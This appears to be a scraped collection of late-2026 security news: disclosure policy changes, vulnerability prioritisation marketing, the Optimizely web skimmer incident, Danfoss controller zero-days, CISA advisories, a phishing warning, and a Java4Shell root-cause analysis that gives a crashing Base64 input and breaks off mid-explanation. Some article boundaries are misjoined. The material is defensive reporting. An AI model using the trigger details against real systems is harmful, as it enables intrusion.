articles.title: Anthropic Cuts Disclosure Deadline to 30 Days For Serious Bugs
articles.context: On the same day, Google's Threat Intelligence Group reported finding an exposed server hosting an attacker framework, dubbed exploit_agent, built to research vulnerabilities and...
articles.full_text:
Anthropic has cut the time vendors get to fix serious flaws found by its Claude models before it makes them public from 90 days to 30. The change applies to vulnerabilities Anthropic reports to vendors and maintainers, not generally to bugs reported to Anthropic by external researchers.

The company's Frontier Red Team announced the change in a November 16 post, with the new timelines applying to vulnerabilities reported on or after January 1, 2027. Reports already in progress then will keep their existing deadlines.

Anthropic said disclosure norms, including its own, had assumed fixes moved at human speed and that independent rediscovery was unlikely, but that "neither assumption holds today." It said bugs one model could find were increasingly likely to be found by another.

What Changes in Anthropic's Disclosure Policy

Under the updated policy, high- and critical-severity vulnerabilities will have a 30-day disclosure deadline, while all other issues will have 45 days. Anthropic will aim to escalate to an external vulnerability coordinator after 15 days without a maintainer response, rather than 30.

The company will also wait 30 days after a patch becomes available before publishing full technical details, down from 45 days. The seven-day disclosure window for vulnerabilities under active exploitation remains unchanged.

Anthropic said it would work with vendors on a remediation timeline for flaws in hard-to-deploy software such as critical infrastructure, or flaws that need specification or RFC changes. The policy will not cover AI-discovered findings that have not received human review, such as those from its OSS Scanner.

Acknowledging that shorter timelines could put more pressure on maintainers, Anthropic said it would keep sending actionable guidance with each report, plus a patch or mitigation where possible.

Read more on vulnerability disclosure: AI Cuts Vulnerability Discovery from Nine Months to 90 Hours

How Anthropic's Deadlines Compare With Project Zero's

The change puts Anthropic's serious-bug deadline ahead of Project Zero's schedule. Google's team, which now publishes details 90 days after reporting a bug whether or not it is fixed, will cut that to 60 days on February 2, 2027 and 30 days on January 3, 2028.

The approaches also differ on severity. Anthropic will set different disclosure windows based on severity, while Project Zero argued that a vulnerability's severity does not affect how likely attackers are to find it.

On the same day, Google's Threat Intelligence Group reported finding an exposed server hosting an attacker framework, dubbed exploit_agent, built to research vulnerabilities and weaponize them.

Anthropic said it was now giving maintainers 30 more days on high- and critical-severity bugs that had passed its current 90-day deadline, before publishing them on its disclosure dashboard.

articles.title: Your Vulnerability Scanner Found 10,000 Issues. Which Ones Actually Matter?
articles.context: By combining vulnerability data with exploitability, asset criticality, exposure, attacker activity and existing controls, security teams can turn a growing volume of findings...
articles.full_text:
Finding vulnerabilities is rarely the hardest part of Vulnerability Management.

Modern vulnerability scanning services can continuously examine internal and external networks, web applications, APIs, databases and cloud environments, producing thousands, or even tens of thousands, of findings. The challenge begins after the scan finishes.

Which vulnerability should your team fix first?

A list of 10,000 findings may look comprehensive, but treating every vulnerability as equally urgent can overwhelm remediation teams, consume resources and distract attention from the weaknesses attackers are most likely to exploit.

Effective threat and vulnerability management requires a shift in perspective: from counting vulnerabilities to understanding risk.

Why vulnerability volume can be misleading

In 2025 alone, 48,185 new CVEs were published which was >20% more than were released in 2024. This ever-increasing rate of issues released makes it increasingly difficult for organizations to effectively keep up with the threat. Security teams have traditionally relied on vulnerability severity scores to organize remediation. A critical vulnerability goes to the top of the queue. A medium-severity vulnerability can wait.

That's useful as a starting point, but severity alone doesn't tell the entire story.

Consider two vulnerabilities:

A critical vulnerability exists on an isolated internal system protected by multiple security controls, with no evidence of active exploitation.

A high-severity vulnerability affects an internet-facing system containing sensitive information, and attackers are actively exploiting the weakness.

If remediation is based strictly on severity, the critical vulnerability may receive attention first. From a risk perspective, however, the second issue may represent the more immediate threat.

This distinction becomes increasingly important as both vulnerability inventories and assets within an organization’s attack surface rapidly grow. Simply generating more findings isn't necessarily improving security, especially when raw scanner output includes false positives that consume remediation time without reducing risk. The real measure of an effective vulnerability program is whether the organization can identify and reduce its most meaningful risks.

Identify and address risks with LevelBlue Vulnerability Management.

Learn More

Five factors that reveal which vulnerabilities matter

Risk-based vulnerability prioritization adds context to scanner findings. Rather than asking only, "How severe is this vulnerability?" security teams can consider several factors together.

1. Exploitability

A vulnerability that can realistically be exploited deserves different treatment from one that requires highly specific conditions, substantial attacker access or a complex exploit chain.

Teams should consider whether exploit code is publicly available, what level of access exploitation requires and how difficult the vulnerability is to exploit in the organization's specific environment.

Where the answer is unclear, penetration testing or proof-of-concept validation can confirm whether a finding is truly exploitable.

The distinction matters because a vulnerability's theoretical severity isn't synonymous with its practical likelihood of exploitation.

2. Asset criticality

Not every asset has the same value to the business.

A vulnerability on an employee test machine and the same vulnerability on a production server supporting a critical business process create different levels of organizational risk. That’s not to say you shouldn’t fix the vulnerability on the employee test machine, as it could still be leveraged as a pivot by an attacker to other areas of the network; however, it might take a backseat to the production instance.

Effective vulnerability management tools should help teams combine technical findings with asset context. Relevant questions include:

What business process does this asset support?

Does it store or process sensitive data?

Would compromise disrupt essential operations?

What systems could an attacker reach from it

Asset context helps transform a scanner finding into a business risk decision.

3. Exposure

Where the vulnerable asset sits also matters.

An internet-accessible system presents a fundamentally different attack surface from a tightly segmented internal asset. Network accessibility, security architecture, identity requirements and potential attack paths should all influence remediation priority.

Teams need to look beyond whether a vulnerability exists and ask: Can an attacker actually reach it?

That question can dramatically change a remediation queue.

4. Real-world attacker activity

Threat intelligence provides another critical piece of context.

Attackers do not exploit every known vulnerability equally. Some vulnerabilities rapidly become part of ransomware campaigns or automated exploitation, while others may see little meaningful attacker activity.

Understanding whether threat actors are actively targeting a vulnerability allows teams to adjust priorities as the threat environment changes.

A vulnerability that was a lower priority yesterday may require immediate action if new exploitation activity emerges today. That is why effective threat and vulnerability management is an ongoing process rather than a periodic scanning exercise.

5. Compensating controls

A vulnerability doesn't exist in isolation from the rest of the security environment.

Endpoint protection, network segmentation, application controls, identity protections, increased logging / monitoring, and other safeguards may reduce the likelihood or potential impact of exploitation. They don't necessarily eliminate the need to mitigate an identified weakness, but they can influence how urgently remediation is required.

Conversely, the absence or weakness of those controls can increase priority.

Understanding compensating controls helps security teams make remediation decisions based on the environment they actually operate, rather than on vulnerability data alone.

From vulnerability findings to meaningful risk reduction

This broader context is where managed vulnerability scanning evolves into a comprehensive vulnerability management strategy.Scanning establishes visibility into weaknesses across the environment. Mature vulnerability management enriches those findings with asset, exposure and threat context, enabling teams to determine appropriate remediation priorities.

A repeatable process can help operationalize this approach:

Discover → Validate → Prioritize → Remediate → Retest

Discovery identifies vulnerabilities across an organization’s entire, ever expanding attack surface, including IT assets, cloud environments, SaaS applications, APIs, IoT and OT systems, and other externally exposed technologies. Expert validation confirms which findings are real and exploitable, removing false positives before they consume remediation time. Prioritization then applies asset, exposure, and threat context to direct attention toward the findings that present the greatest risk. Remediation addresses that risk through activities such as patching, configuration changes, or compensating controls whether performed by internal teams, supported through patch management capabilities, or delivered through managed remediation services for assets requiring hands-on intervention. Retesting confirms that the vulnerability or exposure has been effectively mitigated.

This process also makes vulnerability data more actionable for the teams responsible for remediation. Infrastructure, application, cloud and operations teams often balance security work against availability requirements, development priorities, and other business demands. Providing those teams with contextualized priorities creates a clearer path to addressing the exposures that can have the greatest impact.

That need is growing as AI accelerates vulnerability discovery. Assessments such as SentinelOne's Wayfinder Frontier AI Services can surface validated, exploitable weaknesses across source code, software dependencies and exposed secrets in days, widening the remediation gap between finding a weakness and eliminating it. Closing that gap takes the same discipline: prioritize by real-world risk, give developers actionable guidance and retest to confirm each fix holds.

A risk-based program prioritizes remediation by exploitability and business impact. It expands scope to the full attack surface and focuses that effort around several key principles:

Evaluate exploitability: Determine how practical exploitation is within the organization's environment.

Connect vulnerabilities with critical assets: Incorporate the systems, sensitive data and business processes that could be affected.

Understand exposure: Assess how accessible vulnerable assets are and the potential attack paths leading to them.

Track attacker activity: Incorporate current threat intelligence and evidence of exploitation as conditions evolve.

Account for compensating controls: Understand how existing safeguards affect the likelihood and potential impact of exploitation.

Retest and verify fixes: Confirm, through retesting and pre-production review, that remediation or mitigation produced the intended reduction in exposure.

Together, these factors turn scanner output into a focused remediation strategy and give security teams a stronger basis for communicating priorities across the organization.

Effective vulnerability management services help organizations prioritize the vulnerabilities that represent the greatest risk and direct remediation resources accordingly. By combining vulnerability data with exploitability, asset criticality, exposure, attacker activity and existing controls, security teams can turn a growing volume of findings into clear, defensible priorities and measurable risk reduction.

LevelBlue Vulnerability Management combines continuous internal and external scanning, expert validation that filters out false positives, and risk prioritization informed by LevelBlue SpiderLabs threat intelligence, along with multiple third-party threat intelligence feeds that help contextualize vulnerabilities within each customer’s unique environment. Leveraging best-of-breed technologies, LevelBlue helps organizations focus remediation efforts on the issues most likely to impact their business, while dashboards track progress and support compliance with standards such as PCI DSS, HIPAA, NIST and ISO. For organizations that need additional support moving from identification to resolution, LevelBlue also offers Patch Management and Remediation as a Service capabilities that accelerate risk reduction across both traditional and non-traditional assets. Organizations working through Wayfinder Frontier AI Services findings can further extend that approach through LevelBlue’s Remediation Sprint and Application Resilience Program, which provides developer-focused remediation and independent validation of fixes.

articles.title: The Vulnerability Playbook Is Broken: A CISO’s Cheat Sheet To AI-Era Cybersecurity
articles.context: When a fix does exist, attackers can use frontier AI to analyze it shortly after it is published and build exploits targeting systems that haven’t yet applied it
articles.full_text:
Vulnerability remediation has been following the same outdated playbook: A scanner finds a vulnerable component, a ticket gets filed, a developer gets assigned. Then a pull request gets reviewed, and a pipeline runs. Then weeks or months later, the vulnerability is closed. That playbook assumed one thing: We have time.

We no longer do.

Exploitation Before Disclosure: The Structural Shift

Over the past year, frontier AI models have changed the daily calculus for security and DevOps leaders. AI developers have reported that their most capable models can autonomously find software vulnerabilities and develop working exploits. That puts components with no upstream fix, such as end-of-life packages and abandoned libraries, at particular risk.

Crucially, the assumption that disclosure precedes exploitation no longer holds, and frontier AI is accelerating that shift. The window between a flaw existing and being actively exploited has collapsed – in some cases to nothing at all.

With the clock at zero, remediation is fundamentally a speed problem, and mean time to remediate (MTTR) no longer favors the defender. If your workflow depends on a human pause at every step – manual triage, pull request reviews, sequential approvals – it will struggle to keep pace.

You cannot fight machine speed with human delays.

Where Today’s Approach Breaks Down

As the industry confronts machine-speed threats, new problems have emerged that many remediation workflows were not designed to handle.

When No Fix Exists. When frontier AI discovers vulnerabilities in end-of-life components, or chains findings into exploits with no corresponding CVE, remediation tools that depend on upstream fix availability have nothing to apply. There is no patch to apply. There is no version to bump to.

When The Fix Arrives Too Late. The mirror image is equally dangerous. When a fix does exist, attackers can use frontier AI to analyze it shortly after it is published and build exploits targeting systems that haven’t yet applied it. Every hour between fix availability and fix deployment is an open exploitation window. The organizations that understand this treat fix deployment speed as a security metric, not an operational convenience.

When a Fix Exists and You Are Running a Self-hosted Environment. Securing self-hosted or hybrid environments is a shared responsibility between vendor and customer. While vendors regularly release critical security patches and updated remediation capabilities, keeping these platforms secure requires active, ongoing updates. Staying current on supported releases ensures your environment benefits from the latest protection against emerging threats.

In our view, none of the AI-era problems mentioned above can be closed by any single tool. Closing them requires a system – one built deliberately across five interconnected layers.

The Required Approach: A Five-Layer, Self-healing Architecture

Matching machine speed requires an architecture that can support it in a machine-automated way, with minimal requirements for human attention. We call this a Self-Healing Software Supply Chain – five critical layers, each addressing a different part of the problem, each one complementing and completing the next.

Prevent – Block risk before it enters. While this layer doesn’t directly solve the problems above, it helps keep new ones from forming. Before you can address what’s already inside, you need to stop adding to it. Flag something before it enters. Swap it automatically for a compliant version, so development keeps moving.

Detect – Find what’s already inside. Conduct regular scans of the different components in your pipelines – packages, binaries, containers, AI models. Detection must operate at the binary level, not just at the manifest level, to catch issues that manifest scanning can miss.

Prioritize – Focus on what can actually be exploited. Not every finding is a real risk in your specific environment. Contextual and reachability analysis help identify the exploitable vulnerabilities in your codebase – so remediation effort lands where it matters.

Remediate – Close the gap automatically. This is where a single approach is rarely enough:

Remediation agents draft fixes for first-party code, with a developer reviewing each change. That review is an important safeguard, but tracking what each agent changed, why, and under what policy is a real challenge at scale.

Hardened package providers manufacture patches for the exact version you run, but automatically getting those patches to every build while adhering to your policies is a separate delivery problem.

Automatic remediation allows you to automatically intercept the artifact request at the repository layer and serve a verified patched version in its place – designed to avoid pipeline disruption. For supported package types, ask for version 1.2.3, receive a fixed 1.2.3, recorded automatically, under policy. Source fixes from multiple providers, such as hardened package vendors and your own patches. Avoid locking into one vendor. This is only possible when a single, universal repository layer sits between every build and the packages it requests.

Prove – Make every action auditable. A fix that produces no evidence is a risk, not an asset. Every remediation action must generate a cryptographically signed record – what was fixed, when, under which policy. The same is true for what was not fixed. Every waiver or exception should be tracked, including the remediation plan, so teams can confirm the follow-through is completed. Ideally, the process generates evidence automatically, so nobody has to assemble it by hand afterward.

Traceability extends past the fix itself. Every dependency in your release should stay under your custody. You can reproduce a build, trace a fix to its source, or swap a provider without losing your history. Lose that lineage, and you depend operationally on decisions someone else made for you.

Seven Properties That Make a Self-Healing Software Supply Chain Work

The five layers above work best when they follow the right properties. In our view, these are the minimum design requirements for a self-healing supply chain.

Automated remediation. Remediation runs automatically, under rules your team sets. Humans govern it through policy, not through manual approval on every action.

Policy-driven. Every remediation action is designed to operate within your organizational guardrails, so changes follow the policies you approve.

Auditable. Every remediation action is signed and traced, producing evidence you can use for audits and regulatory reviews.

Machine speed. Remediation works to close the exploitation window as threats emerge.

Frictionless. Fixes are designed to be applied without breaking builds or slowing developer workflows so security can keep pace with delivery.

Integrated in pipelines. A bolted-on solution lacks the context and the ability to act safely, from blocking risk at the door to fixing what’s already inside. Remediation must be part of the system, throughout the software lifecycle, not layered on top of it.

Universal by design. Remediation can draw on fixes from multiple vendors and sources, so teams can choose the best available fix for their specific environment.

Where This Leaves You

This CISO cheat sheet is not about closing every gap perfectly – it’s about building a supply chain that heals faster than attackers can exploit it. When prevention, detection, and remediation work as one continuous system instead of several disconnected tools, the same speed that once favored attackers starts working for you.

Fewer tickets pile up. Fewer patches wait on human bandwidth. The question shifts from “how did they get in?” to “how fast did we already fix it?” CISOs can walk into board meetings with answers instead of open questions. Engineering teams no longer have to choose between shipping fast and staying secure.

Organizations that adopt this self-healing CISO cheat sheet now can turn remediation speed into an operational advantage.

articles.title: Optimizely Flaw Exploited to Serve Malicious Code to Visitors of 178 Organizations
articles.context: Read more on software supply-chain attacks: Attackers Hijack Popular WordPress Plugins to Deploy Backdoors Report URI said the real number of affected organizations was likely...
articles.full_text:
An attacker has exploited a flaw in the website testing platform of Optimizely, a digital experience platform, to plant malicious code that reached visitors of 178 organizations' websites, including Zoom, the BBC and CNN, according to security researchers.

Scott Helme, a security researcher at Report URI, said that his team found the code in 188 of the 1611 Optimizely snippets it checked. Other affected organizations included Salesforce, GitLab, IKEA and Optimizely itself.

Optimizely confirmed the incident in a November 17 notice, saying an "unauthorized party exploited a vulnerability in Experimentation" and used it to add malicious JavaScript to some customer projects.

It said it had fixed the flaw, removed the injected code and taken steps to secure affected user accounts.

What the Malicious Code Did

The attacker inserted code into the Project JavaScript of customer projects, a custom-code field that runs on every page, and left the rest of each snippet untouched. The tampered files were still served from Optimizely's trusted content delivery network with its certificate, Report URI explained.

The injected JavaScript swapped cryptocurrency wallet addresses for the attacker's own, and Report URI said those wallets had received about $7,040 by 19:25 UTC on November 16 before being emptied early the next day.

The code also worked as a card skimmer, capturing card details typed into websites' own forms, though cards entered in hosted payment iframes were out of its reach. It also stole some cookies and page screenshots.

On iPhones and iPads, the JavaScript delivered two iOS exploit kits, which Report URI identified as Coruna and DarkSword. Report URI advised visitors to update to iOS 18.7.3 or later, or iOS 26.3 or later.

How the Optimizely Attack Unfolded

The first injection was seen at 04:21 UTC on November 16, and Report URI said all infected files had been cleaned by 23:11 UTC.

The attacker has not been named, but Report URI said one of its wallets had been in use since March 2026, and linked the same actor to an earlier wave of injections through other third-party scripts.

"Supply chain breaches may be an inherent weakness of the web in its current form, but this doesn't excuse organizations from failing to reduce their own attack surface," said William Wright, CEO of Closed Door Security, in emailed comments.

Read more on software supply-chain attacks: Attackers Hijack Popular WordPress Plugins to Deploy Backdoors

Report URI said the real number of affected organizations was likely higher, as it could only check snippets it found in time.

articles.title: 'Not rocket surgery' claims researcher who found six Danfoss fridge controller zero-days in under an hour
articles.context: A Dutch cybersecurity researcher claims he found six zero-days in Danfoss refrigeration controller firmware in under an hour, then delivered a withering assessment of the...
articles.full_text: A Dutch cybersecurity researcher claims he found six zero-days in Danfoss refrigeration controller firmware in under an hour, then delivered a withering assessment of the vendor's defenses against memory corruption. The Centre for Cybersecurity Belgium (CCB) warns that the flaws could let attackers take control without credentials, potentially retain access after resets, or disable controllers altogether. Carlo Meijer of cyber consultancy Midnight Blue examined the latest AK-SM800A firmware, version 5.3.2, manually – no AI required. He said that he went looking in random places where strcpy() is invoked, given the vendor's "extremely liberal use" of the function (which doesn't check whether the destination buffer is large enough), and swiftly found five cases in which he said he could trigger a segfault with a one-line cURL command. "Of course, remotely triggering a crash is bad in itself, but being able to leverage the buffer overflow to obtain remote code execution is much worse," he wrote. Meijer added: "Any reasonably experienced exploit developer will agree exploiting straightforward stack-based buffer overflows on ARM Linux without exploit mitigations is very straightforward. And if they don't, there's probably a frontier or open-weight model out there willing to help them agree." He noted that before achieving RCE, an attacker would need to overcome the limitation of strcpy() where it stops copying bytes after hitting a null byte, but said "it's not exactly rocket surgery." He went on to claim: "Also, the exploited application runs as root (because of course it does)." Later firmware adds "session control," an authentication mechanism whose strict setting blocks unauthenticated access to most web interfaces. But Meijer found a memory corruption flaw in that protective layer too. He described the final zero-day as a "trivial" pre-auth memory corruption bug which again starts with a segfault but can be wangled into an RCE "with some additional effort." Meijer also considered whether attackers could maintain access after a reset, as seen with implants such as Saltwater and Firestarter. He considered this feasible because the controllers do not use their processor's secure boot features. "In such a scenario, an attacker could either retain remote access or leave a time-triggered payload for a 2nd (or 3rd...) strike – increasing damage by spoiling new batches of food," said Meijer. "Alternatively, attackers could simply wipe flash memory and/or push a malformed firmware update to brick the controllers and render them permanently inoperable – requiring costly and time-consuming replacement similar to the TTPs deployed during the December 2025 attack on the Polish electric grid." Meijer's priority for operators was to remove the controllers' direct internet exposure, rather than spend scarce resources on piecemeal patching. He said the vendor's advice following the attacks on European supermarkets and blood banks in recent weeks – rotating creds, applying patches, enabling strict session control – was insufficient given the flaws in the controllers' codebase. "This is insufficient and asset owners need to remove internet exposure as soon as possible," said Meijer. "We recommend against allocating scarce security resources to patching efforts and instead focus on reducing exposure." The CCB likewise urged operators to remove direct internet exposure immediately, but also recommended applying patches when they become available. Beyond the liberal use of strcpy(), Meijer criticized the absence of standard exploit mitigations, including stack canaries and position-independent executables. "These mechanisms have been staples of memory corruption defenses for decades and enabling these features... requires no engineering work at all," he said. "It is simply a matter of setting the right compiler flag. Enabling these features became the default in Ubuntu 17.10 and there is simply no excuse for a network-facing application that was last updated a few months ago to not have them enabled." The Register asked Danfoss to respond to the findings, but it did not reply. Danfoss has consistently blanked our requests for information since being implicated in at least some of the attacks that affected European supermarkets recently, alongside rival controller vendors Copeland and Dixell. It also did not respond when we asked about its involvement in the attacks on US commissary appliances over the summer, after some alleged that its controllers were targeted. ®

Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet.

Recommended Practices

CISA recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities.

Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet.

Locate control system networks and remote devices behind firewalls and isolating them from business networks.

When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices.

CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics. Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies.

CISA encourages organizations to implement recommended cybersecurity strategies for proactive defense of ICS assets.

Additional mitigation guidance and recommended practices are publicly available on the ICS webpage at cisa.gov/ics in the technical information paper, ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies.

Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents.

CISA also recommends users take the following measures to protect themselves from social engineering attacks:

Do not click web links or open attachments in unsolicited email messages.

Refer to Recognizing and Avoiding Email Scams for more information on avoiding email scams.

Refer to Avoiding Social Engineering and Phishing Attacks for more information on social engineering attacks.

No known public exploitation specifically targeting these vulnerabilities has been reported to CISA at this time.

articles.title: CISA Adds One Known Exploited Vulnerability to Catalog
articles.context: CISA has added one new vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog, based on evidence of active exploitation
articles.full_text:
CISA has added one new vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog, based on evidence of active exploitation.

CVE-2026-115731 Perforce Puppet Enterprise Deserialization of Untrusted Data Vulnerability

This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise.

Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied.

While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities. CISA will continue to add vulnerabilities to the catalog that meet the specified criteria.

Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form. Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

articles.title: Critical Java Vulnerability Requires Immediate Patching
articles.context: This critical memory-corruption vulnerability, known as “Java4Shell,” affects the Base64 decoder of the x86-64 HotSpot Java Virtual Machine (JVM), which is part of the Java...
articles.full_text:
Purpose

CISA strongly urges organizations to immediately patch the recently disclosed Oracle Java vulnerability CVE-2026-114938. This critical memory-corruption vulnerability, known as “Java4Shell,” affects the Base64 decoder of the x86-64 HotSpot Java Virtual Machine (JVM), which is part of the Java Development Kit (JDK). Specially crafted Base64 input could crash the JVM and allow for unauthenticated remote code execution.

Actions to take

CISA urges organizations to take the following actions:

Identify affected Java installations. Review your software inventory for JDKs and Java runtimes, including those bundled with third-party applications or included in container images and appliances. Note: JDKs and Java runtimes may not appear as separate entries in software inventories.

Apply relevant Java and vendor patches as soon as they are available, prioritizing internet-facing systems.

If immediate patching is not feasible, implement temporary compensating controls, such as restricting and validating Base64 input at the application boundary, enforcing input-size limits, and limiting unauthenticated access.

Review Oracle’s security advisory for guidance on patching and affected products and versions.

Monitor for indicators of suspicious activity, including rogue runtimes, unexpected JVM crashes, and suspicious Java processes.

Resources

CISA urges network defenders to review the following resource and apply necessary updates:

Vendor Guidance

Oracle’s Security Advisory: Critical Security Patch Update – November 2026

On October 21, 2026, the Node.js project released security updates addressing a critical vulnerability in the Brotli decoder bundled with Node.js, commonly referred to as "Node2Shell" (tracked as CVE-2026-111497). articles.title: Phishing scheme exploiting Microsoft outage | Kaspersky official blog
articles.context: How attackers lure victims to a phishing site Since Microsoft services went down suddenly on Friday and remained unavailable until the end of the workday, operations at...
articles.full_text:
As you are probably aware, Microsoft experienced a global outage on November 12 that affected Microsoft 365 services, among others. By the morning of November 14, service functionality had been fully restored; however, cybercriminals are still attempting to exploit this news story in their phishing schemes. The email campaign I want to warn you about in this post targets corporate users and is still being detected by our security solutions even today — November 17.

How attackers lure victims to a phishing site

Since Microsoft services went down suddenly on Friday and remained unavailable until the end of the workday, operations at companies that rely on Microsoft 365 as their primary communication tools came to a virtual standstill. Many employees are still unsure whether their services have been restored, and, more importantly, don’t understand the cause of the incident and fear it might happen again. Exploiting this uncertainty and fear, cybercriminals are sending emails with the alarming subject line “Outlook is disconnected after the Microsoft 365 outage”, purportedly on behalf of Microsoft. In these emails, they claim that Outlook, SharePoint, and Exchange Online may not function properly until the recipient reconnects their Office account.

The email contains a verification code and a link that the recipient is supposed to follow to “reconnect”, which in reality leads to a phishing site.

What are the attackers trying to achieve?

The attackers’ website mimics the Microsoft login screen. Of course, there is nowhere to enter the code provided in the email — a code that no one requested. But they warn in advance that it may have expired, so maybe it might be necessary to generate a replacement. The attackers first ask victim to enter an account name, then offer to send a new code, and finally ask to enter it. However, at every step there’s a “Use your password” link.

Apparently, the attackers were trying to create a universal scheme designed to either connect an unauthorized device to a Microsoft 365 account or steal corporate credentials. Particularly telling is the same “outage” message left in the sign-in window, which is supposed to be a standard one rather than one tied to a specific use case.

We’ve already discussed how the device connection scheme — also known as Device Code Phishing —works on the Securelist blog. In short, as soon as the email recipient clicks the “Send code” button, the attackers’ scripts begin connecting an unauthorized device to the victim’s account. Microsoft sends a genuine code; the victim enters it on the attackers’ website, and the attackers relay it back to Microsoft. As a result, all data accessible through the Microsoft 365 account becomes available to the attackers.

And if the victim doesn’t want to go through the trouble of sending the code, they can simply hand over their password — the attackers will find a use for that, too.

How to stay safe

First and foremost, we recommend regularly raising employee awareness about modern cyberthreats (for example, using the Kaspersky Automated Security Awareness Platform), particularly by explaining exactly how modern phishing schemes work. In addition, it makes sense to explain to employees that if they receive any authorization code they didn’t request or expect, that’s a red flag.

And to ensure that phishing emails cause employees less concern, it’s best to block them at the corporate email gateway level. For this purpose, we offer a specialized solution: Kaspersky Secure Mail Gateway.

articles.title: Java4Shell: Remote Code Execution in OpenJDK (CVE-2026-114938)
articles.context: Exploiting this vulnerability requires the affected Java runtime to execute its AVX-512 Vector Byte Manipulation Instructions (VBMI) decoding path
articles.full_text:
Key points and observations

CVE-2026-114938 is an out-of-bounds write in OpenJDK's optimized Base64 decoder.

Denial of service is the more readily achievable impact where attacker-controlled input reaches the vulnerable decoder. Reliable remote code execution requires additional exploitation work tailored to the application and Java Virtual Machine (JVM) environment.

Exploiting this vulnerability requires the affected Java runtime to execute its AVX-512 Vector Byte Manipulation Instructions (VBMI) decoding path. Systems running on processors that lack AVX-512 VBMI support are not affected.

On affected x86-64 deployments, starting the JVM with -XX:UseAVX=2 disables the AVX-512 path and prevented out-of-bounds writes in our tests. Scope the flag to x86 deployments as native ARM64 JVMs do not recognize it and will fail to start if that flag is passed.

In a standalone test, the extra write corrupted a neighboring array's header and the JVM later crashed during garbage collection. The resulting damage depends on which objects occupy the overwritten memory.

What happened

On November 17, 2026, Oracle released a security update for CVE-2026-114938, an out-of-bounds write in OpenJDK’s optimized Base64 decoder. This vulnerability affects OpenJDK 17.0.6 and later and has been rated 9.2 (Critical) under CVSS 4.0.

While the vulnerability can lead to remote code execution in a worst-case scenario, it is important to stress that an attacker would have to do additional work for every application they target. There is no single, universal exploit that would work against all Java applications.

How to know if you’re affected

Oracle stated that the Java versions affected by vulnerabilities patched in this release are as below:

Java release line

Affected releases

First fixed release

Java 17

17.0.6 through versions before 17.0.21.1

17.0.21.1+4

Java 21

All versions of Java 21 before 21.0.13.1

21.0.13.1+4

Java 25

All versions of Java 25 before 25.0.5.1

25.0.5.1+4

Java 27

All versions of Java 27 before 27.0.1.1

27.0.1.1+4

In addition to running a vulnerable version of Java, the application must be running on a CPU that supports the AVX-512 VBMI decoding path. Not all systems (including modern ones) support this instruction set so it is recommended to check when prioritizing systems for patching. The following is a shell command to see if the instruction set is supported:

grep -om1 -E 'avx512[_]?vbmi' /proc/cpuinfo

If this command returns nothing, that is an indication that the CPU does not support VBMI. If the command returns avx512vbmi and/or avx512_vbmi, that is a signal that it does support VBMI and could be potentially vulnerable.

Native ARM64 Java runtimes are not affected by this vulnerability because they do not execute the vulnerable x86 AVX-512 decoding path.

An affected Java runtime and a compatible CPU are prerequisites, but the application must also pass attacker-controlled data to the vulnerable decoder. In the OpenJDK 17.0.6 build we tested, the AVX-512 path handles the basic and URL decoders returned by Base64.getDecoder() and Base64.getUrlDecoder(). The MIME decoder returned by Base64.getMimeDecoder() bypasses this path.

This distinction matters when assessing authentication and token-processing code. Base64-encoded credentials, tokens, or SAML messages expose an application only if its implementation passes the malformed value to the affected decoder. Libraries that implement their own decoding, or reject or normalize the value before calling the JDK decoder, can behave differently.

From a Java method to a native decoder

Java's Base64.Decoder supports decoding into a new array or one supplied by the caller. In both cases, it calculates the required output space before decoding. The allocating method uses that calculation directly:

public byte[] decode(byte[] src) { byte[] dst = new byte[decodedOutLength(src, 0, src.length)]; int ret = decode0(src, 0, src.length, dst); if (ret != dst.length) { dst = Arrays.copyOf(dst, ret); } return dst; }

The allocation is not the source of the overflow. Further down this call chain, HotSpot's optimizing compiler, C2, can replace decodeBlock() with a native implementation. These replacements, called intrinsics, let the JVM use specialized CPU instructions. The native implementation must respect the bounds of the Java arrays it receives.

The AVX-512 decoding routine converts each 64-byte input block into 48 output bytes. When fewer than 64 input bytes remain, a separate handler decodes the final fragment. That is where the length calculation goes wrong.

Padding produces a negative output length

Consider a value containing 128 A characters followed by one =:

value = b"A" * 128 + b"="

The first 128 characters form complete Base64 groups. The final = is invalid: Padding cannot form a group by itself. However, the initial output-length calculation does not reject this value. It counts the input and trailing padding and produces a destination length of 98 bytes.

The native routine decodes the first 128 characters into 96 bytes. It then reaches the final-fragment handler with just the = remaining.

To calculate the fragment's output size, the handler divides the remaining length by four, discards the remainder, and multiplies by three. In HotSpot's code generator, those operations are:

__ movl(output_size, length); __ shrl(output_size, 2); // Find (len / 4) * 3 (output length) __ lea(output_size, Address(output_size, output_size, Address::times_2, 0));

For a 1-byte fragment, this produces zero. The padding branch then decrements output_size for the trailing =. There is no check that the result remains nonnegative, so the count becomes -1.

The same problem occurs with other fragments containing fewer than 4 bytes.

The negative count enables a full-width store

AVX-512 supports masked stores, where individual mask bits determine which bytes reach memory. The decoder uses the output count to construct such a mask. A count of zero should permit no writes; a count of three should permit 3 output bytes.

